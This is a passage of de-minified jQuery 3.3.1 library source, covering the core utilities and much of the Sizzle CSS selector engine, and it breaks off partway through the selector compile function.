!function (e, t) {
  "use strict";

  "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function (e) {
    if (!e.document) throw new Error("jQuery requires a window with a document");
    return t(e);
  } : t(e);
}("undefined" != typeof window ? window : this, function (C, e) {
  "use strict";

  function g(e) {
    return null != e && e === e.window;
  }
  var t = [],
    k = C.document,
    i = Object.getPrototypeOf,
    s = t.slice,
    m = t.concat,
    l = t.push,
    o = t.indexOf,
    n = {},
    r = n.toString,
    v = n.hasOwnProperty,
    a = v.toString,
    d = a.call(Object),
    y = {},
    b = function (e) {
      return "function" == typeof e && "number" != typeof e.nodeType;
    },
    c = {
      type: !0,
      src: !0,
      noModule: !0
    };
  function w(e, t, n) {
    var i,
      o = (t = t || k).createElement("script");
    if (o.text = e, n) for (i in c) n[i] && (o[i] = n[i]);
    t.head.appendChild(o).parentNode.removeChild(o);
  }
  function x(e) {
    return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? n[r.call(e)] || "object" : typeof e;
  }
  var S = function (e, t) {
      return new S.fn.init(e, t);
    },
    u = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
  function p(e) {
    var t = !!e && "length" in e && e.length,
      n = x(e);
    return !b(e) && !g(e) && ("array" === n || 0 === t || "number" == typeof t && 0 < t && t - 1 in e);
  }
  S.fn = S.prototype = {
    jquery: "3.3.1",
    constructor: S,
    length: 0,
    toArray: function () {
      return s.call(this);
    },
    get: function (e) {
      return null == e ? s.call(this) : e < 0 ? this[e + this.length] : this[e];
    },
    pushStack: function (e) {
      var t = S.merge(this.constructor(), e);
      return t.prevObject = this, t;
    },
    each: function (e) {
      return S.each(this, e);
    },
    map: function (n) {
      return this.pushStack(S.map(this, function (e, t) {
        return n.call(e, t, e);
      }));
    },
    slice: function () {
      return this.pushStack(s.apply(this, arguments));
    },
    first: function () {
      return this.eq(0);
    },
    last: function () {
      return this.eq(-1);
    },
    eq: function (e) {
      var t = this.length,
        n = +e + (e < 0 ? t : 0);
      return this.pushStack(0 <= n && n < t ? [this[n]] : []);
    },
    end: function () {
      return this.prevObject || this.constructor();
    },
    push: l,
    sort: t.sort,
    splice: t.splice
  }, S.extend = S.fn.extend = function () {
    var e,
      t,
      n,
      i,
      o,
      r,
      a = arguments[0] || {},
      s = 1,
      l = arguments.length,
      d = !1;
    for ("boolean" == typeof a && (d = a, a = arguments[s] || {}, s++), "object" == typeof a || b(a) || (a = {}), s === l && (a = this, s--); s < l; s++) if (null != (e = arguments[s])) for (t in e) n = a[t], a !== (i = e[t]) && (d && i && (S.isPlainObject(i) || (o = Array.isArray(i))) ? (r = o ? (o = !1, n && Array.isArray(n) ? n : []) : n && S.isPlainObject(n) ? n : {}, a[t] = S.extend(d, r, i)) : void 0 !== i && (a[t] = i));
    return a;
  }, S.extend({
    expando: "jQuery" + ("3.3.1" + Math.random()).replace(/\D/g, ""),
    isReady: !0,
    error: function (e) {
      throw new Error(e);
    },
    noop: function () {},
    isPlainObject: function (e) {
      var t, n;
      return !(!e || "[object Object]" !== r.call(e) || (t = i(e)) && ("function" != typeof (n = v.call(t, "constructor") && t.constructor) || a.call(n) !== d));
    },
    isEmptyObject: function (e) {
      var t;
      for (t in e) return !1;
      return !0;
    },
    globalEval: function (e) {
      w(e);
    },
    each: function (e, t) {
      var n,
        i = 0;
      if (p(e)) for (n = e.length; i < n && !1 !== t.call(e[i], i, e[i]); i++);else for (i in e) if (!1 === t.call(e[i], i, e[i])) break;
      return e;
    },
    trim: function (e) {
      return null == e ? "" : (e + "").replace(u, "");
    },
    makeArray: function (e, t) {
      var n = t || [];
      return null != e && (p(Object(e)) ? S.merge(n, "string" == typeof e ? [e] : e) : l.call(n, e)), n;
    },
    inArray: function (e, t, n) {
      return null == t ? -1 : o.call(t, e, n);
    },
    merge: function (e, t) {
      for (var n = +t.length, i = 0, o = e.length; i < n; i++) e[o++] = t[i];
      return e.length = o, e;
    },
    grep: function (e, t, n) {
      for (var i = [], o = 0, r = e.length, a = !n; o < r; o++) !t(e[o], o) != a && i.push(e[o]);
      return i;
    },
    map: function (e, t, n) {
      var i,
        o,
        r = 0,
        a = [];
      if (p(e)) for (i = e.length; r < i; r++) null != (o = t(e[r], r, n)) && a.push(o);else for (r in e) null != (o = t(e[r], r, n)) && a.push(o);
      return m.apply([], a);
    },
    guid: 1,
    support: y
  }), "function" == typeof Symbol && (S.fn[Symbol.iterator] = t[Symbol.iterator]), S.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
    n["[object " + t + "]"] = t.toLowerCase();
  });
  var h = function (n) {
    function u(e, t, n) {
      var i = "0x" + t - 65536;
      return i != i || n ? t : i < 0 ? String.fromCharCode(65536 + i) : String.fromCharCode(i >> 10 | 55296, 1023 & i | 56320);
    }
    function o() {
      j();
    }
    var e,
      h,
      w,
      r,
      a,
      f,
      p,
      g,
      x,
      l,
      d,
      j,
      C,
      s,
      k,
      m,
      c,
      v,
      y,
      S = "sizzle" + 1 * new Date(),
      b = n.document,
      $ = 0,
      i = 0,
      T = ae(),
      E = ae(),
      D = ae(),
      _ = function (e, t) {
        return e === t && (d = !0), 0;
      },
      A = {}.hasOwnProperty,
      t = [],
      I = t.pop,
      P = t.push,
      H = t.push,
      M = t.slice,
      L = function (e, t) {
        for (var n = 0, i = e.length; n < i; n++) if (e[n] === t) return n;
        return -1;
      },
      N = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
      O = "[\\x20\\t\\r\\n\\f]",
      R = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",
      F = "\\[" + O + "*(" + R + ")(?:" + O + "*([*^$|!~]?=)" + O + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + R + "))|)" + O + "*\\]",
      B = ":(" + R + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + F + ")*)|.*)\\)|)",
      z = new RegExp(O + "+", "g"),
      q = new RegExp("^" + O + "+|((?:^|[^\\\\])(?:\\\\.)*)" + O + "+$", "g"),
      W = new RegExp("^" + O + "*," + O + "*"),
      U = new RegExp("^" + O + "*([>+~]|" + O + ")" + O + "*"),
      Y = new RegExp("=" + O + "*([^\\]'\"]*?)" + O + "*\\]", "g"),
      X = new RegExp(B),
      V = new RegExp("^" + R + "$"),
      K = {
        ID: new RegExp("^#(" + R + ")"),
        CLASS: new RegExp("^\\.(" + R + ")"),
        TAG: new RegExp("^(" + R + "|[*])"),
        ATTR: new RegExp("^" + F),
        PSEUDO: new RegExp("^" + B),
        CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + O + "*(even|odd|(([+-]|)(\\d*)n|)" + O + "*(?:([+-]|)" + O + "*(\\d+)|))" + O + "*\\)|)", "i"),
        bool: new RegExp("^(?:" + N + ")$", "i"),
        needsContext: new RegExp("^" + O + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + O + "*((?:-\\d)?\\d*)" + O + "*\\)|)(?=[^-]|$)", "i")
      },
      Q = /^(?:input|select|textarea|button)$/i,
      G = /^h\d$/i,
      J = /^[^{]+\{\s*\[native \w/,
      Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
      ee = /[+~]/,
      te = new RegExp("\\\\([\\da-f]{1,6}" + O + "?|(" + O + ")|.)", "ig"),
      ne = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
      ie = function (e, t) {
        return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e;
      },
      oe = ye(function (e) {
        return !0 === e.disabled && ("form" in e || "label" in e);
      }, {
        dir: "parentNode",
        next: "legend"
      });
    try {
      H.apply(t = M.call(b.childNodes), b.childNodes), t[b.childNodes.length].nodeType;
    } catch (n) {
      H = {
        apply: t.length ? function (e, t) {
          P.apply(e, M.call(t));
        } : function (e, t) {
          for (var n = e.length, i = 0; e[n++] = t[i++];);
          e.length = n - 1;
        }
      };
    }
    function re(e, t, n, i) {
      var o,
        r,
        a,
        s,
        l,
        d,
        c,
        u = t && t.ownerDocument,
        p = t ? t.nodeType : 9;
      if (n = n || [], "string" != typeof e || !e || 1 !== p && 9 !== p && 11 !== p) return n;
      if (!i && ((t ? t.ownerDocument || t : b) !== C && j(t), t = t || C, k)) {
        if (11 !== p && (l = Z.exec(e))) if (o = l[1]) {
          if (9 === p) {
            if (!(a = t.getElementById(o))) return n;
            if (a.id === o) return n.push(a), n;
          } else if (u && (a = u.getElementById(o)) && y(t, a) && a.id === o) return n.push(a), n;
        } else {
          if (l[2]) return H.apply(n, t.getElementsByTagName(e)), n;
          if ((o = l[3]) && h.getElementsByClassName && t.getElementsByClassName) return H.apply(n, t.getElementsByClassName(o)), n;
        }
        if (h.qsa && !D[e + " "] && (!m || !m.test(e))) {
          if (1 !== p) u = t, c = e;else if ("object" !== t.nodeName.toLowerCase()) {
            for ((s = t.getAttribute("id")) ? s = s.replace(ne, ie) : t.setAttribute("id", s = S), r = (d = f(e)).length; r--;) d[r] = "#" + s + " " + ve(d[r]);
            c = d.join(","), u = ee.test(e) && ge(t.parentNode) || t;
          }
          if (c) try {
            return H.apply(n, u.querySelectorAll(c)), n;
          } catch (e) {} finally {
            s === S && t.removeAttribute("id");
          }
        }
      }
      return g(e.replace(q, "$1"), t, n, i);
    }
    function ae() {
      var i = [];
      return function e(t, n) {
        return i.push(t + " ") > w.cacheLength && delete e[i.shift()], e[t + " "] = n;
      };
    }
    function se(e) {
      return e[S] = !0, e;
    }
    function le(e) {
      var t = C.createElement("fieldset");
      try {
        return !!e(t);
      } catch (e) {
        return !1;
      } finally {
        t.parentNode && t.parentNode.removeChild(t), t = null;
      }
    }
    function de(e, t) {
      for (var n = e.split("|"), i = n.length; i--;) w.attrHandle[n[i]] = t;
    }
    function ce(e, t) {
      var n = t && e,
        i = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
      if (i) return i;
      if (n) for (; n = n.nextSibling;) if (n === t) return -1;
      return e ? 1 : -1;
    }
    function ue(t) {
      return function (e) {
        return "input" === e.nodeName.toLowerCase() && e.type === t;
      };
    }
    function pe(n) {
      return function (e) {
        var t = e.nodeName.toLowerCase();
        return ("input" === t || "button" === t) && e.type === n;
      };
    }
    function he(t) {
      return function (e) {
        return "form" in e ? e.parentNode && !1 === e.disabled ? "label" in e ? "label" in e.parentNode ? e.parentNode.disabled === t : e.disabled === t : e.isDisabled === t || e.isDisabled !== !t && oe(e) === t : e.disabled === t : "label" in e && e.disabled === t;
      };
    }
    function fe(a) {
      return se(function (r) {
        return r = +r, se(function (e, t) {
          for (var n, i = a([], e.length, r), o = i.length; o--;) e[n = i[o]] && (e[n] = !(t[n] = e[n]));
        });
      });
    }
    function ge(e) {
      return e && void 0 !== e.getElementsByTagName && e;
    }
    for (e in h = re.support = {}, a = re.isXML = function (e) {
      var t = e && (e.ownerDocument || e).documentElement;
      return !!t && "HTML" !== t.nodeName;
    }, j = re.setDocument = function (e) {
      var t,
        n,
        i = e ? e.ownerDocument || e : b;
      return i !== C && 9 === i.nodeType && i.documentElement && (s = (C = i).documentElement, k = !a(C), b !== C && (n = C.defaultView) && n.top !== n && (n.addEventListener ? n.addEventListener("unload", o, !1) : n.attachEvent && n.attachEvent("onunload", o)), h.attributes = le(function (e) {
        return e.className = "i", !e.getAttribute("className");
      }), h.getElementsByTagName = le(function (e) {
        return e.appendChild(C.createComment("")), !e.getElementsByTagName("*").length;
      }), h.getElementsByClassName = J.test(C.getElementsByClassName), h.getById = le(function (e) {
        return s.appendChild(e).id = S, !C.getElementsByName || !C.getElementsByName(S).length;
      }), h.getById ? (w.filter.ID = function (e) {
        var t = e.replace(te, u);
        return function (e) {
          return e.getAttribute("id") === t;
        };
      }, w.find.ID = function (e, t) {
        if (void 0 !== t.getElementById && k) {
          var n = t.getElementById(e);
          return n ? [n] : [];
        }
      }) : (w.filter.ID = function (e) {
        var n = e.replace(te, u);
        return function (e) {
          var t = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
          return t && t.value === n;
        };
      }, w.find.ID = function (e, t) {
        if (void 0 !== t.getElementById && k) {
          var n,
            i,
            o,
            r = t.getElementById(e);
          if (r) {
            if ((n = r.getAttributeNode("id")) && n.value === e) return [r];
            for (o = t.getElementsByName(e), i = 0; r = o[i++];) if ((n = r.getAttributeNode("id")) && n.value === e) return [r];
          }
          return [];
        }
      }), w.find.TAG = h.getElementsByTagName ? function (e, t) {
        return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : h.qsa ? t.querySelectorAll(e) : void 0;
      } : function (e, t) {
        var n,
          i = [],
          o = 0,
          r = t.getElementsByTagName(e);
        if ("*" !== e) return r;
        for (; n = r[o++];) 1 === n.nodeType && i.push(n);
        return i;
      }, w.find.CLASS = h.getElementsByClassName && function (e, t) {
        if (void 0 !== t.getElementsByClassName && k) return t.getElementsByClassName(e);
      }, c = [], m = [], (h.qsa = J.test(C.querySelectorAll)) && (le(function (e) {
        s.appendChild(e).innerHTML = "<a id='" + S + "'></a><select id='" + S + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && m.push("[*^$]=" + O + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || m.push("\\[" + O + "*(?:value|" + N + ")"), e.querySelectorAll("[id~=" + S + "-]").length || m.push("~="), e.querySelectorAll(":checked").length || m.push(":checked"), e.querySelectorAll("a#" + S + "+*").length || m.push(".#.+[+~]");
      }), le(function (e) {
        e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
        var t = C.createElement("input");
        t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && m.push("name" + O + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && m.push(":enabled", ":disabled"), s.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && m.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), m.push(",.*:");
      })), (h.matchesSelector = J.test(v = s.matches || s.webkitMatchesSelector || s.mozMatchesSelector || s.oMatchesSelector || s.msMatchesSelector)) && le(function (e) {
        h.disconnectedMatch = v.call(e, "*"), v.call(e, "[s!='']:x"), c.push("!=", B);
      }), m = m.length && new RegExp(m.join("|")), c = c.length && new RegExp(c.join("|")), t = J.test(s.compareDocumentPosition), y = t || J.test(s.contains) ? function (e, t) {
        var n = 9 === e.nodeType ? e.documentElement : e,
          i = t && t.parentNode;
        return e === i || !(!i || 1 !== i.nodeType || !(n.contains ? n.contains(i) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(i)));
      } : function (e, t) {
        if (t) for (; t = t.parentNode;) if (t === e) return !0;
        return !1;
      }, _ = t ? function (e, t) {
        if (e === t) return d = !0, 0;
        var n = !e.compareDocumentPosition - !t.compareDocumentPosition;
        return n || (1 & (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !h.sortDetached && t.compareDocumentPosition(e) === n ? e === C || e.ownerDocument === b && y(b, e) ? -1 : t === C || t.ownerDocument === b && y(b, t) ? 1 : l ? L(l, e) - L(l, t) : 0 : 4 & n ? -1 : 1);
      } : function (e, t) {
        if (e === t) return d = !0, 0;
        var n,
          i = 0,
          o = e.parentNode,
          r = t.parentNode,
          a = [e],
          s = [t];
        if (!o || !r) return e === C ? -1 : t === C ? 1 : o ? -1 : r ? 1 : l ? L(l, e) - L(l, t) : 0;
        if (o === r) return ce(e, t);
        for (n = e; n = n.parentNode;) a.unshift(n);
        for (n = t; n = n.parentNode;) s.unshift(n);
        for (; a[i] === s[i];) i++;
        return i ? ce(a[i], s[i]) : a[i] === b ? -1 : s[i] === b ? 1 : 0;
      }), C;
    }, re.matches = function (e, t) {
      return re(e, null, null, t);
    }, re.matchesSelector = function (e, t) {
      if ((e.ownerDocument || e) !== C && j(e), t = t.replace(Y, "='$1']"), h.matchesSelector && k && !D[t + " "] && (!c || !c.test(t)) && (!m || !m.test(t))) try {
        var n = v.call(e, t);
        if (n || h.disconnectedMatch || e.document && 11 !== e.document.nodeType) return n;
      } catch (e) {}
      return 0 < re(t, C, null, [e]).length;
    }, re.contains = function (e, t) {
      return (e.ownerDocument || e) !== C && j(e), y(e, t);
    }, re.attr = function (e, t) {
      (e.ownerDocument || e) !== C && j(e);
      var n = w.attrHandle[t.toLowerCase()],
        i = n && A.call(w.attrHandle, t.toLowerCase()) ? n(e, t, !k) : void 0;
      return void 0 !== i ? i : h.attributes || !k ? e.getAttribute(t) : (i = e.getAttributeNode(t)) && i.specified ? i.value : null;
    }, re.escape = function (e) {
      return (e + "").replace(ne, ie);
    }, re.error = function (e) {
      throw new Error("Syntax error, unrecognized expression: " + e);
    }, re.uniqueSort = function (e) {
      var t,
        n = [],
        i = 0,
        o = 0;
      if (d = !h.detectDuplicates, l = !h.sortStable && e.slice(0), e.sort(_), d) {
        for (; t = e[o++];) t === e[o] && (i = n.push(o));
        for (; i--;) e.splice(n[i], 1);
      }
      return l = null, e;
    }, r = re.getText = function (e) {
      var t,
        n = "",
        i = 0,
        o = e.nodeType;
      if (o) {
        if (1 === o || 9 === o || 11 === o) {
          if ("string" == typeof e.textContent) return e.textContent;
          for (e = e.firstChild; e; e = e.nextSibling) n += r(e);
        } else if (3 === o || 4 === o) return e.nodeValue;
      } else for (; t = e[i++];) n += r(t);
      return n;
    }, (w = re.selectors = {
      cacheLength: 50,
      createPseudo: se,
      match: K,
      attrHandle: {},
      find: {},
      relative: {
        ">": {
          dir: "parentNode",
          first: !0
        },
        " ": {
          dir: "parentNode"
        },
        "+": {
          dir: "previousSibling",
          first: !0
        },
        "~": {
          dir: "previousSibling"
        }
      },
      preFilter: {
        ATTR: function (e) {
          return e[1] = e[1].replace(te, u), e[3] = (e[3] || e[4] || e[5] || "").replace(te, u), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4);
        },
        CHILD: function (e) {
          return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || re.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && re.error(e[0]), e;
        },
        PSEUDO: function (e) {
          var t,
            n = !e[6] && e[2];
          return K.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && X.test(n) && (t = f(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3));
        }
      },
      filter: {
        TAG: function (e) {
          var t = e.replace(te, u).toLowerCase();
          return "*" === e ? function () {
            return !0;
          } : function (e) {
            return e.nodeName && e.nodeName.toLowerCase() === t;
          };
        },
        CLASS: function (e) {
          var t = T[e + " "];
          return t || (t = new RegExp("(^|" + O + ")" + e + "(" + O + "|$)")) && T(e, function (e) {
            return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "");
          });
        },
        ATTR: function (n, i, o) {
          return function (e) {
            var t = re.attr(e, n);
            return null == t ? "!=" === i : !i || (t += "", "=" === i ? t === o : "!=" === i ? t !== o : "^=" === i ? o && 0 === t.indexOf(o) : "*=" === i ? o && -1 < t.indexOf(o) : "$=" === i ? o && t.slice(-o.length) === o : "~=" === i ? -1 < (" " + t.replace(z, " ") + " ").indexOf(o) : "|=" === i && (t === o || t.slice(0, o.length + 1) === o + "-"));
          };
        },
        CHILD: function (f, e, t, g, m) {
          var v = "nth" !== f.slice(0, 3),
            y = "last" !== f.slice(-4),
            b = "of-type" === e;
          return 1 === g && 0 === m ? function (e) {
            return !!e.parentNode;
          } : function (e, t, n) {
            var i,
              o,
              r,
              a,
              s,
              l,
              d = v != y ? "nextSibling" : "previousSibling",
              c = e.parentNode,
              u = b && e.nodeName.toLowerCase(),
              p = !n && !b,
              h = !1;
            if (c) {
              if (v) {
                for (; d;) {
                  for (a = e; a = a[d];) if (b ? a.nodeName.toLowerCase() === u : 1 === a.nodeType) return !1;
                  l = d = "only" === f && !l && "nextSibling";
                }
                return !0;
              }
              if (l = [y ? c.firstChild : c.lastChild], y && p) {
                for (h = (s = (i = (o = (r = (a = c)[S] || (a[S] = {}))[a.uniqueID] || (r[a.uniqueID] = {}))[f] || [])[0] === $ && i[1]) && i[2], a = s && c.childNodes[s]; a = ++s && a && a[d] || (h = s = 0) || l.pop();) if (1 === a.nodeType && ++h && a === e) {
                  o[f] = [$, s, h];
                  break;
                }
              } else if (p && (h = s = (i = (o = (r = (a = e)[S] || (a[S] = {}))[a.uniqueID] || (r[a.uniqueID] = {}))[f] || [])[0] === $ && i[1]), !1 === h) for (; (a = ++s && a && a[d] || (h = s = 0) || l.pop()) && ((b ? a.nodeName.toLowerCase() !== u : 1 !== a.nodeType) || !++h || (p && ((o = (r = a[S] || (a[S] = {}))[a.uniqueID] || (r[a.uniqueID] = {}))[f] = [$, h]), a !== e)););
              return (h -= m) === g || h % g == 0 && 0 <= h / g;
            }
          };
        },
        PSEUDO: function (e, r) {
          var t,
            a = w.pseudos[e] || w.setFilters[e.toLowerCase()] || re.error("unsupported pseudo: " + e);
          return a[S] ? a(r) : 1 < a.length ? (t = [e, e, "", r], w.setFilters.hasOwnProperty(e.toLowerCase()) ? se(function (e, t) {
            for (var n, i = a(e, r), o = i.length; o--;) e[n = L(e, i[o])] = !(t[n] = i[o]);
          }) : function (e) {
            return a(e, 0, t);
          }) : a;
        }
      },
      pseudos: {
        not: se(function (e) {
          var i = [],
            o = [],
            s = p(e.replace(q, "$1"));
          return s[S] ? se(function (e, t, n, i) {
            for (var o, r = s(e, null, i, []), a = e.length; a--;) (o = r[a]) && (e[a] = !(t[a] = o));
          }) : function (e, t, n) {
            return i[0] = e, s(i, null, n, o), i[0] = null, !o.pop();
          };
        }),
        has: se(function (t) {
          return function (e) {
            return 0 < re(t, e).length;
          };
        }),
        contains: se(function (t) {
          return t = t.replace(te, u), function (e) {
            return -1 < (e.textContent || e.innerText || r(e)).indexOf(t);
          };
        }),
        lang: se(function (n) {
          return V.test(n || "") || re.error("unsupported lang: " + n), n = n.replace(te, u).toLowerCase(), function (e) {
            var t;
            do {
              if (t = k ? e.lang : e.getAttribute("xml:lang") || e.getAttribute("lang")) return (t = t.toLowerCase()) === n || 0 === t.indexOf(n + "-");
            } while ((e = e.parentNode) && 1 === e.nodeType);
            return !1;
          };
        }),
        target: function (e) {
          var t = n.location && n.location.hash;
          return t && t.slice(1) === e.id;
        },
        root: function (e) {
          return e === s;
        },
        focus: function (e) {
          return e === C.activeElement && (!C.hasFocus || C.hasFocus()) && !!(e.type || e.href || ~e.tabIndex);
        },
        enabled: he(!1),
        disabled: he(!0),
        checked: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && !!e.checked || "option" === t && !!e.selected;
        },
        selected: function (e) {
          return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected;
        },
        empty: function (e) {
          for (e = e.firstChild; e; e = e.nextSibling) if (e.nodeType < 6) return !1;
          return !0;
        },
        parent: function (e) {
          return !w.pseudos.empty(e);
        },
        header: function (e) {
          return G.test(e.nodeName);
        },
        input: function (e) {
          return Q.test(e.nodeName);
        },
        button: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && "button" === e.type || "button" === t;
        },
        text: function (e) {
          var t;
          return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase());
        },
        first: fe(function () {
          return [0];
        }),
        last: fe(function (e, t) {
          return [t - 1];
        }),
        eq: fe(function (e, t, n) {
          return [n < 0 ? n + t : n];
        }),
        even: fe(function (e, t) {
          for (var n = 0; n < t; n += 2) e.push(n);
          return e;
        }),
        odd: fe(function (e, t) {
          for (var n = 1; n < t; n += 2) e.push(n);
          return e;
        }),
        lt: fe(function (e, t, n) {
          for (var i = n < 0 ? n + t : n; 0 <= --i;) e.push(i);
          return e;
        }),
        gt: fe(function (e, t, n) {
          for (var i = n < 0 ? n + t : n; ++i < t;) e.push(i);
          return e;
        })
      }
    }).pseudos.nth = w.pseudos.eq, {
      radio: !0,
      checkbox: !0,
      file: !0,
      password: !0,
      image: !0
    }) w.pseudos[e] = ue(e);
    for (e in {
      submit: !0,
      reset: !0
    }) w.pseudos[e] = pe(e);
    function me() {}
    function ve(e) {
      for (var t = 0, n = e.length, i = ""; t < n; t++) i += e[t].value;
      return i;
    }
    function ye(s, e, t) {
      var l = e.dir,
        d = e.next,
        c = d || l,
        u = t && "parentNode" === c,
        p = i++;
      return e.first ? function (e, t, n) {
        for (; e = e[l];) if (1 === e.nodeType || u) return s(e, t, n);
        return !1;
      } : function (e, t, n) {
        var i,
          o,
          r,
          a = [$, p];
        if (n) {
          for (; e = e[l];) if ((1 === e.nodeType || u) && s(e, t, n)) return !0;
        } else for (; e = e[l];) if (1 === e.nodeType || u) if (o = (r = e[S] || (e[S] = {}))[e.uniqueID] || (r[e.uniqueID] = {}), d && d === e.nodeName.toLowerCase()) e = e[l] || e;else {
          if ((i = o[c]) && i[0] === $ && i[1] === p) return a[2] = i[2];
          if ((o[c] = a)[2] = s(e, t, n)) return !0;
        }
        return !1;
      };
    }
    function be(o) {
      return 1 < o.length ? function (e, t, n) {
        for (var i = o.length; i--;) if (!o[i](e, t, n)) return !1;
        return !0;
      } : o[0];
    }
    function we(e, t, n, i, o) {
      for (var r, a = [], s = 0, l = e.length, d = null != t; s < l; s++) (r = e[s]) && (n && !n(r, i, o) || (a.push(r), d && t.push(s)));
      return a;
    }
    function xe(h, f, g, m, v, e) {
      return m && !m[S] && (m = xe(m)), v && !v[S] && (v = xe(v, e)), se(function (e, t, n, i) {
        var o,
          r,
          a,
          s = [],
          l = [],
          d = t.length,
          c = e || function (e, t, n) {
            for (var i = 0, o = t.length; i < o; i++) re(e, t[i], n);
            return n;
          }(f || "*", n.nodeType ? [n] : n, []),
          u = !h || !e && f ? c : we(c, s, h, n, i),
          p = g ? v || (e ? h : d || m) ? [] : t : u;
        if (g && g(u, p, n, i), m) for (o = we(p, l), m(o, [], n, i), r = o.length; r--;) (a = o[r]) && (p[l[r]] = !(u[l[r]] = a));
        if (e) {
          if (v || h) {
            if (v) {
              for (o = [], r = p.length; r--;) (a = p[r]) && o.push(u[r] = a);
              v(null, p = [], o, i);
            }
            for (r = p.length; r--;) (a = p[r]) && -1 < (o = v ? L(e, a) : s[r]) && (e[o] = !(t[o] = a));
          }
        } else p = we(p === t ? p.splice(d, p.length) : p), v ? v(null, t, p, i) : H.apply(t, p);
      });
    }
    function je(e) {
      for (var o, t, n, i = e.length, r = w.relative[e[0].type], a = r || w.relative[" "], s = r ? 1 : 0, l = ye(function (e) {
          return e === o;
        }, a, !0), d = ye(function (e) {
          return -1 < L(o, e);
        }, a, !0), c = [function (e, t, n) {
          var i = !r && (n || t !== x) || ((o = t).nodeType ? l(e, t, n) : d(e, t, n));
          return o = null, i;
        }]; s < i; s++) if (t = w.relative[e[s].type]) c = [ye(be(c), t)];else {
        if ((t = w.filter[e[s].type].apply(null, e[s].matches))[S]) {
          for (n = ++s; n < i && !w.relative[e[n].type]; n++);
          return xe(1 < s && be(c), 1 < s && ve(e.slice(0, s - 1).concat({
            value: " " === e[s - 2].type ? "*" : ""
          })).replace(q, "$1"), t, s < n && je(e.slice(s, n)), n < i && je(e = e.slice(n)), n < i && ve(e));
        }
        c.push(t);
      }
      return be(c);
    }
    function Ce(m, v) {
      function e(e, t, n, i, o) {
        var r,
          a,
          s,
          l = 0,
          d = "0",
          c = e && [],
          u = [],
          p = x,
          h = e || b && w.find.TAG("*", o),
          f = $ += null == p ? 1 : Math.random() || .1,
          g = h.length;
        for (o && (x = t === C || t || o); d !== g && null != (r = h[d]); d++) {
          if (b && r) {
            for (a = 0, t || r.ownerDocument === C || (j(r), n = !k); s = m[a++];) if (s(r, t || C, n)) {
              i.push(r);
              break;
            }
            o && ($ = f);
          }
          y && ((r = !s && r) && l--, e && c.push(r));
        }
        if (l += d, y && d !== l) {
          for (a = 0; s = v[a++];) s(c, u, t, n);
          if (e) {
            if (0 < l) for (; d--;) c[d] || u[d] || (u[d] = I.call(i));
            u = we(u);
          }
          H.apply(i, u), o && !e && 0 < u.length && 1 < l + v.length && re.uniqueSort(i);
        }
        return o && ($ = f, x = p), c;
      }
      var y = 0 < v.length,
        b = 0 < m.length;
      return y ? se(e) : e;
    }
    return me.prototype = w.filters = w.pseudos, w.setFilters = new me(), f = re.tokenize = function (e, t) {
      var n,
        i,
        o,
        r,
        a,
        s,
        l,
        d = E[e + " "];
      if (d) return t ? 0 : d.slice(0);
      for (a = e, s = [], l = w.preFilter; a;) {
        for (r in n && !(i = W.exec(a)) || (i && (a = a.slice(i[0].length) || a), s.push(o = [])), n = !1, (i = U.exec(a)) && (n = i.shift(), o.push({
          value: n,
          type: i[0].replace(q, " ")
        }), a = a.slice(n.length)), w.filter) !(i = K[r].exec(a)) || l[r] && !(i = l[r](i)) || (n = i.shift(), o.push({
          value: n,
          type: r,
          matches: i
        }), a = a.slice(n.length));
        if (!n) break;
      }
      return t ? a.length : a ? re.error(e) : E(e, s).slice(0);
    }, p = re.compile = function (e, t) {
      var n,
        i = [],
        o = [],
        r = D[e + " "];
      if (!r) {
        for (n = (t = t || f(e)).length; n--;) (r = je(t[n]))[S] ? i.push(r) : o.push(r);
